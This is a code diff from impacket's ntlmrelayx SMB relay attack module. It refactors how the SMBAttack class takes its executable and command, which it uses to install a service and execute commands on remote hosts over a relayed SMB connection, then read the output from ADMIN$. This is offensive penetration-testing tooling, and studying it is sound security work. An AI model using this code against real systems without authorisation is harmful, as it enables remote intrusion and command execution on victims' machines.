@@ -53,9 +53,8 @@ from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.smbconnection import SMBConnection
 
-
 class SMBAttack(Thread):
-    def __init__(self, config, SMBClient, exeFile, command):
+    def __init__(self, config, SMBClient, username):
         Thread.__init__(self)
         self.daemon = True
         if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
@@ -63,18 +62,17 @@ class SMBAttack(Thread):
         else:
             self.__SMBConnection = SMBClient
         self.config = config
-        self.__exeFile = exeFile
-        self.__command = command
         self.__answerTMP = ''
-        if exeFile is not None:
-            self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
+        if self.config.exeFile is not None:
+            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)
+
 
     def __answer(self, data):
         self.__answerTMP += data
 
     def run(self):
         # Here PUT YOUR CODE!
-        if self.__exeFile is not None:
+        if self.config.exeFile is not None:
             result = self.installService.install()
             if result is True:
                 logging.info("Service Installed.. CONNECT!")
@@ -97,8 +95,8 @@ class SMBAttack(Thread):
                 return
 
             try:
-                if self.__command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.__command)
+                if self.config.command is not None:
+                    remoteOps._RemoteOperations__executeRemote(self.config.command)
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                     self.__answerTMP = ''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
